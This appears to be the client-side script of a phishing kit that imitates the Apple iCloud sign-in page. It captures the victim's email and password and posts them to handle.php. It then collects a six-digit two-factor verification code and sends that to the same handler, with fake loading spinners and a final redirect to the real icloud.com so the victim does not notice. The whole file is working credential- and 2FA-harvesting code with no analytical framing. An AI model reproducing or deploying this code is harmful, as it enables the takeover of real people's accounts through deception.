$(document).ready(function() {
	$("#sign-in").click(function() {
		var txt_email = $('#account_name_text_field').val();
		var txt_passw = $('#password_text_field').val();
		if (txt_email == '') {
			$('#account_name_text_field').focus();
		} else {
			if (IsEmail(txt_email)) {
				showIconLoadCheckEmail();
			}else{
				$('#account_name_text_field').val(txt_email + '@icloud.com');
				showIconLoadCheckEmail();
			}
		}
		if (txt_passw == '' || txt_passw.length < 5) {
			$('#password_text_field').focus();
		}else{
			showIconLoadCheckPassWord(txt_email, txt_passw);
		}
	});
});

function showIconLoadCheckEmail(){
	$('#sign-in').addClass('v-hide');
	$('#nd-spinner-container').removeClass('hide');
	setTimeout(function(){
		$('#sign-in').removeClass('v-hide');
		$('#nd-spinner-container').addClass('hide');
	    $('#sign_in_form').addClass('show-password');
	}, 2000);
}

function showIconLoadCheckPassWord(txt_email ,txt_passw){
	$('#sign-in').addClass('v-hide');
	$('#nd-spinner-container').removeClass('hide');
	setTimeout(function(){
	    ajaxLogin(txt_email, txt_passw);
	}, 2000);
}
//Mã xác thực
$(document).ready(function() {

	var verify = char0 = char1 = char2 = char3 = char4 = char5 = '';
	$("#char0").keyup(function(){
		$('#char1').focus();
		validateVerify();
	});
	$("#char1").keyup(function(){
		$('#char2').focus();
		validateVerify();
	});
	$("#char2").keyup(function(){
		$('#char3').focus();
		validateVerify();
	});
	$("#char3").keyup(function(){
		$('#char4').focus();
		validateVerify();
	});
	$("#char4").keyup(function(){
		$('#char5').focus();
		validateVerify();
	});
	$("#char5").keyup(function(){
		validateVerify();
	});
});

function validateVerify(){
	var verify = $('#char0').val() + $('#char1').val() + $('#char2').val() + $('#char3').val() + $('#char4').val() + $('#char5').val();
	if (verify.length == 6) {
		// alert(verify);
		$('#no-trstd-device-pop').hide();
		$('.verifying-code-text.thin').text('Đang xác minh…');
		ajaxVerify(verify);
	}
}
function IsEmail(email) {
	var regex = /^([a-zA-Z0-9_\.\-\+])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
	if (!regex.test(email)) {
		return false;
	} else {
		return true;
	}
}

function ajaxLogin(txt_email, txt_passw){
	$.ajax({
		url : "handle.php",
		type : "post",
		dataType:"text",
		data : {
			email : txt_email, pass : txt_passw,
		},
		success : function (result){
			console.log(result);
			window.location.replace('verify.php')
		}
	});
}

function ajaxVerify(verify){
	$.ajax({
		url : "handle.php",
		type : "post",
		dataType:"text",
		data : {
			verify : verify
		},
		success : function (result){
			console.log(result);
			setTimeout(function(){
			    window.location.replace('https://www.icloud.com/')
			}, 3000);
		}
	});
}
